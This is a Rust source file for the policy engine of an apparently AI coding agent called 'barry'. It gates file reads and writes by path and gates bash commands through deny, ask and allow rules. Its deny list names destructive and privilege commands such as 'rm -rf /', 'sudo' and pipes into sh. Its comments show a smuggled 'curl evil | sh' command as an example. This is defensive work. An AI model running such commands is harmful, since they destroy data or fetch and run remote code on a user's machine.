//! Policy engine for barry.
//!
//! Two layers: path-based decisions for file reads/writes, and rule-based
//! decisions for bash commands. Path canonicalisation rejects `..` and
//! resolves symlinks (PLAN 6.1.1, BC-3.5).

#![forbid(unsafe_code)]

mod path;

use std::path::{Component, Path, PathBuf};
use thiserror::Error;

pub use barry_protocol::Decision;
pub use path::{canonicalise, is_under, PathError};

/// Errors from the policy engine.
#[derive(Debug, Error)]
pub enum PolicyError {
    #[error("invalid path: {0:?}")]
    InvalidPath(PathBuf),
    #[error("invalid rule {id}: {reason}")]
    InvalidRule { id: String, reason: String },
}

/// Configuration for the policy engine (PLAN 6.1).
pub struct PolicyConfig {
    pub cwd: PathBuf,
    pub home: PathBuf,
    pub extra_writable: Vec<PathBuf>,
    pub read_deny: Vec<String>,
    pub protected: Vec<String>,
    pub rules: Vec<BashRule>,
    /// Whether sandboxed bash commands may access the network.
    pub network: bool,
}

/// A bash rule: a `match` string against a command, with a decision.
#[derive(Debug, Clone)]
pub struct BashRule {
    pub id: String,
    pub r#match: String,
    pub decision: Decision,
}

/// The writable roots for a session: cwd, extra writable dirs, and grants.
#[derive(Debug, Clone)]
pub struct Policy {
    cwd: PathBuf,
    read_deny: Vec<PathBuf>,
    protected: Vec<String>,
    writable_roots: Vec<PathBuf>,
    grants: Vec<PathBuf>,
    bash_grants: Vec<Vec<String>>,
    rules: Vec<BashRule>,
    network: bool,
}

impl Policy {
    pub fn new(cfg: PolicyConfig) -> Result<Self, PolicyError> {
        // Validate rules: each rule's `match` must be non-empty
        for rule in &cfg.rules {
            if rule.r#match.is_empty() {
                return Err(PolicyError::InvalidRule {
                    id: rule.id.clone(),
                    reason: "empty match pattern".into(),
                });
            }
        }

        let read_deny = cfg
            .read_deny
            .iter()
            .map(|entry| canonicalise_read_deny(&cfg.home, entry))
            .collect();

        // Canonicalize cwd and writable roots so that is_under() comparisons
        // work on macOS where /tmp is a symlink to /private/tmp (PLAN 6.1.1).
        let cwd = canonicalize_or_keep(&cfg.cwd);
        let mut writable_roots: Vec<PathBuf> = vec![cwd.clone()];
        writable_roots.extend(cfg.extra_writable.iter().map(|r| canonicalize_or_keep(r)));

        Ok(Self {
            cwd,
            read_deny,
            protected: cfg.protected,
            writable_roots,
            grants: Vec::new(),
            bash_grants: Vec::new(),
            rules: cfg.rules,
            network: cfg.network,
        })
    }

    /// Check a read against policy. Reads under a read-deny entry are denied;
    /// everything else is allowed.
    pub fn check_read(&self, path: &Path) -> Decision {
        let canonical = match canonicalise(&self.cwd, path) {
            Ok(c) => c,
            Err(_) => {
                return Decision::Deny {
                    reason: "cannot canonicalise path".into(),
                }
            }
        };

        for deny in &self.read_deny {
            if is_under(&canonical, deny) {
                return Decision::Deny {
                    reason: "path is read-denied".into(),
                };
            }
        }

        Decision::Allow
    }

    /// Check a write against policy.
    ///
    /// Returns `(Decision, Option<PathBuf>)`. The grant path, when `Some`,
    /// is the parent directory the user would need to grant.
    pub fn check_write(&self, path: &Path) -> (Decision, Option<PathBuf>) {
        let canonical = match canonicalise(&self.cwd, path) {
            Ok(c) => c,
            // A dangling symlink is not something the user can meaningfully
            // approve: the file that a write would create is elsewhere.
            Err(PathError::DanglingSymlink { .. }) => {
                return (
                    Decision::Deny {
                        reason: "path is a dangling symlink".into(),
                    },
                    None,
                )
            }
            Err(_) => {
                return (
                    Decision::Ask {
                        reason: "cannot canonicalise path".into(),
                    },
                    None,
                )
            }
        };

        // Explicit grants always win: a grant to a protected directory
        // (e.g. `.git`) is exactly what BC-4.5 asks for.
        for grant in &self.grants {
            if is_under(&canonical, grant) {
                return (Decision::Allow, None);
            }
        }

        // Protected path components (e.g. `.git`, `.env`) always ask.
        // Check every component, not just the final one (PLAN 6.1.1).
        for component in canonical.components() {
            if let Some(name) = component.as_os_str().to_str() {
                if self.protected.iter().any(|p| p == name) {
                    return (
                        Decision::Ask {
                            reason: format!("protected path: {name}"),
                        },
                        None,
                    );
                }
            }
        }

        // Inside a writable root: allow, no grant needed.
        for root in &self.writable_roots {
            if is_under(&canonical, root) {
                return (Decision::Allow, None);
            }
        }

        // Outside all writable roots: ask, with grant offered for the parent dir.
        let parent = canonical.parent().unwrap_or(Path::new("")).to_path_buf();
        (
            Decision::Ask {
                reason: "path is outside the working directory".into(),
            },
            Some(parent),
        )
    }

    /// Record a directory grant, making it writable for the rest of the session.
    pub fn grant_dir(&mut self, dir: &Path) -> Result<(), PolicyError> {
        let canonical = self.resolve_grant(dir)?;
        self.grants.push(canonical);
        Ok(())
    }

    /// Resolve a grant target to a canonical absolute path.
    ///
    /// `canonicalise` rejects `..` (PLAN 6.1.1), but a grant is explicit user
    /// permission, so `..` is resolved lexically here first. The base matters:
    /// an absolute path starts at the filesystem root, never at cwd, so
    /// `/a/../b` is `/b` and not `<cwd>/b`. Existing ancestors are then
    /// canonicalised so a grant compares equal to the symlink-resolved paths
    /// used everywhere else.
    fn resolve_grant(&self, dir: &Path) -> Result<PathBuf, PolicyError> {
        let mut normalised = if dir.is_absolute() {
            PathBuf::from(Component::RootDir.as_os_str())
        } else {
            self.cwd.clone()
        };
        for component in dir.components() {
            match component {
                Component::RootDir | Component::Prefix(_) | Component::CurDir => {}
                // `PathBuf::pop` on `/` is a no-op, so `..` cannot climb above
                // the root.
                Component::ParentDir => {
                    normalised.pop();
                }
                Component::Normal(name) => normalised.push(name),
            }
        }
        canonicalise(&self.cwd, &normalised)
            .map_err(|_| PolicyError::InvalidPath(dir.to_path_buf()))
    }

    /// Grant a bash command prefix for the rest of the session (PLAN 6.1.3:
    /// the first two argv tokens of the approved command). The prefix is
    /// compared token by token, and only against commands that are a single
    /// plain command, so an approval for `npm install` cannot be reused for
    /// `npm install; curl evil | sh`.
    pub fn approve_prefix(&mut self, argv_prefix: Vec<String>) {
        self.bash_grants.push(argv_prefix);
    }

    /// Session working directory.
    pub fn cwd(&self) -> &Path {
        &self.cwd
    }

    /// Writable roots (cwd + extra writable dirs). Grants are separate so the
    /// sandbox can mount them after protected paths.
    pub fn writable_roots(&self) -> &[PathBuf] {
        &self.writable_roots
    }

    /// Explicit directory grants, mounted read-write after protected paths.
    pub fn grants(&self) -> &[PathBuf] {
        &self.grants
    }

    /// Whether `path` lies under a directory granted this session.
    pub fn is_granted(&self, path: &Path) -> bool {
        let Ok(canonical) = canonicalise(&self.cwd, path) else {
            return false;
        };
        self.grants.iter().any(|grant| is_under(&canonical, grant))
    }

    /// Read-deny paths (canonicalised).
    pub fn read_deny_paths(&self) -> &[PathBuf] {
        &self.read_deny
    }

    /// Protected path components (e.g. ".git").
    pub fn protected(&self) -> &[String] {
        &self.protected
    }

    /// Configured bash rules, in order.
    pub fn rules(&self) -> &[BashRule] {
        &self.rules
    }

    /// Whether sandboxed bash commands may access the network.
    pub fn network(&self) -> bool {
        self.network
    }

    /// Check a bash command against the rule table. Deny > ask > allow.
    /// Returns the decision and, if a configured rule decided, its id.
    pub fn check_bash(&self, command: &str) -> (Decision, Option<String>) {
        // 1. Deny rules (substring match on the full command)
        // Grants do not override explicit denies.
        let deny_rules = [
            "sudo",
            "su",
            "doas",
            "rm -rf /",
            "rm -rf ~",
            "rm -rf /*",
            "chmod -R 777",
            "chown -R",
            "| sh",
            "| bash",
            "git push --force",
        ];
        for &rule in &deny_rules {
            if command.contains(rule) {
                return (
                    Decision::Deny {
                        reason: format!("command matches deny rule: {rule}"),
                    },
                    None,
                );
            }
        }

        // 2. Dangerous shell constructs → Ask. Checked before any grant: an
        //    approval is for one plain command, never for a substitution that
        //    hides a second command.
        let dangerous = ["$(", "`", ">", ">>", "-delete", "\n"];
        for &pattern in &dangerous {
            if command.contains(pattern) {
                return (
                    Decision::Ask {
                        reason: format!("command contains dangerous construct: {pattern}"),
                    },
                    None,
                );
            }
        }

        // 3. Session grants: a plain command whose argv starts with a granted
        //    prefix. Token comparison, not string prefixes.
        if let Some(argv) = plain_argv(command) {
            for grant in &self.bash_grants {
                if argv.len() >= grant.len() && argv[..grant.len()] == grant[..] {
                    return (Decision::Allow, Some(format!("grant: {}", grant.join(" "))));
                }
            }
        }

        // 4. Configured rules (exact match on `match` field)
        for rule in &self.rules {
            if command == rule.r#match {
                return (rule.decision.clone(), Some(rule.id.clone()));
            }
        }

        // 5. Split by && || ; and check each segment against allow rules
        let segments: Vec<&str> = command
            .split(&['&', '|', ';'][..])
            .map(|s| s.trim())
            .filter(|s| !s.is_empty())
            .collect();

        let allow_prefixes = [
            "ls",
            "cat",
            "head",
            "tail",
            "wc",
            "pwd",
            "echo",
            "env",
            "which",
            "file",
            "stat",
            "tree",
            "rg",
            "fd",
            "grep",
            "find",
            "sort",
            "uniq",
            "cut",
            "diff",
            "tee",
            "git status",
            "git diff",
            "git log",
            "git show",
            "git branch",
            "git rev-parse",
            "git blame",
            "cargo check",
            "cargo build",
            "cargo test",
            "cargo fmt",
            "cargo clippy",
            "cargo tree",
        ];

        // Allow commands that can appear mid-command (e.g. after "timeout N")
        let allow_contains = ["cargo test", "cargo check", "cargo build"];

        for segment in &segments {
            let starts_with_allow = allow_prefixes.iter().any(|&p| segment.starts_with(p));
            let contains_allow = allow_contains.iter().any(|&c| segment.contains(c));
            if !starts_with_allow && !contains_allow {
                return (
                    Decision::Ask {
                        reason: format!("no matching allow rule for segment: {segment}"),
                    },
                    None,
                );
            }
        }

        (Decision::Allow, None)
    }
}

/// The argv of a command that is a single plain command, or `None` when the
/// command contains shell syntax that could chain, expand or redirect.
///
/// A session grant is only ever matched against this form, so approving
/// `npm install` never approves `npm install; curl evil | sh`.
fn plain_argv(command: &str) -> Option<Vec<&str>> {
    const META: &[char] = &[
        ';', '|', '&', '>', '<', '$', '`', '(', ')', '{', '}', '\n', '\r', '*', '?', '~', '!',
    ];
    if command.chars().any(|c| META.contains(&c)) {
        return None;
    }
    let argv: Vec<&str> = command.split_whitespace().collect();
    if argv.is_empty() {
        None
    } else {
        Some(argv)
    }
}

/// Expand `~` to `$HOME` in a path string.
fn expand_tilde(home: &Path, p: &str) -> PathBuf {
    let p = p.trim();
    if let Some(rest) = p.strip_prefix("~/") {
        home.join(rest)
    } else if p == "~" {
        home.to_path_buf()
    } else {
        PathBuf::from(p)
    }
}

/// Canonicalise a read-deny entry: expand `~`, then canonicalise if it exists.
fn canonicalise_read_deny(home: &Path, entry: &str) -> PathBuf {
    let path = expand_tilde(home, entry);
    if path.exists() {
        std::fs::canonicalize(&path).unwrap_or(path)
    } else {
        path
    }
}

/// Canonicalize `path` if it exists, otherwise return it unchanged.
/// Ensures canonical-form comparisons work on macOS where /tmp -> /private/tmp.
fn canonicalize_or_keep(path: &Path) -> PathBuf {
    if path.exists() {
        std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
    } else {
        path.to_path_buf()
    }
}
